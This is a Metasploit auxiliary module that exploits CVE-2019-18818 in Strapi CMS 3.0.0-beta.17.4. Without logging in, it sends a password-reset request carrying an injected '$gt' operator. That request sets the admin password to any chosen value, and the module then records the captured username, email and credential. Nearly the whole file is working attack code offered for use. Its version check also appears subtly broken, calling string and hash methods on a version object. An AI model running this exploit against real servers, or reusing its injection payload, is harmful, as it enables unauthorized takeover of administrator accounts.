##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Strapi CMS Unauthenticated Password Reset',
        'Description' => %q{
          This module abuses the mishandling of a password reset request for
          Strapi CMS version 3.0.0-beta.17.4 to change the password of the admin user.

          Successfully tested against Strapi CMS version 3.0.0-beta.17.4.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'WackyH4cker', # original module creation
          'h00die' # lots of fixes, documentation, standardization
        ],
        'References' => [
          [ 'URL', 'https://vulners.com/cve/CVE-2019-18818' ],
          [ 'URL', 'https://github.com/strapi/strapi/releases/tag/v3.0.0-beta.17.4' ],
          [ 'URL', 'https://github.com/strapi/strapi/pull/4443' ],
          [ 'CVE', '2019-18818' ],
          [ 'EDB', '50716' ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-02-09',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options [
      OptString.new('NEW_PASSWORD', [true, 'New Admin password']),
      OptString.new('TARGETURI', [true, 'The base path to strapi', '/'])
    ]
  end

  # not used, but figured id include it anyways
  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'admin', 'init')
    })
    return Exploit::CheckCode::Unknown('Unable to determine due to a HTTP connection timeout') if res.nil?

    begin
      version = JSON.parse(res.body)
    rescue JSON::ParserError
      return Exploit::CheckCode::Safe("Unable to parse json data: #{res.body}")
    end

    # Untested if it works with versions lower than 3.0.0-beta.17.4.
    # builds of 3.0.0-beta.17.3 and lower fail:
    # npm ERR! gyp: Undefined variable standalone_static_library in binding.gyp while trying to load binding.gyp
    # however vulners shows 3.0.0 and up to 3.0.0-beta.17.4 are vulnerable
    version = Rex::Version.new(version.dig('data', 'strapiVersion'))
    if version.start_with?('3.0.0-beta') && (Rex::Version.new(version.split('-beta.')[1]) <= Rex::Version.new('17.4'))
      return Exploit::CheckCode::Vulnerable("Vulnerable version detected: #{version.dig('data', 'strapiVersion')}")
    end

    Exploit::CheckCode::Safe
  end

  def run
    json_post_data = JSON.generate({
      'code' => { '$gt' => 0 },
      'password' => datastore['NEW_PASSWORD'],
      'passwordConfirmation' => datastore['NEW_PASSWORD']
    })

    print_status('Resetting admin password...')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'auth', 'reset-password'),
      'ctype' => 'application/json',
      'data' => json_post_data
    })

    if res.nil?
      print_error('Unable to determine due to a HTTP connection timeout')
      return
    end

    begin
      json_resp = JSON.parse(res.body)
    rescue JSON::ParserError
      print_error("Unable to parse json data: #{res.body}")
      return
    end

    unless res.code == 200
      print_error('Could not change admin user password, unexpected response code')
      return
    end

    print_good('Password changed successfully!')
    print_good("User: #{json_resp['user']['username']}")
    print_good("Email: #{json_resp['user']['email']}")
    print_good("PASSWORD: #{datastore['NEW_PASSWORD']}")
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      workspace_id: myworkspace_id,
      service_name: 'strapi cms',
      address: rhost,
      port: rport,
      private_type: :password,
      private_data: datastore['NEW_PASSWORD'],
      username: json_resp['user']['username']
    }
    create_credential(credential_data)
  end

end
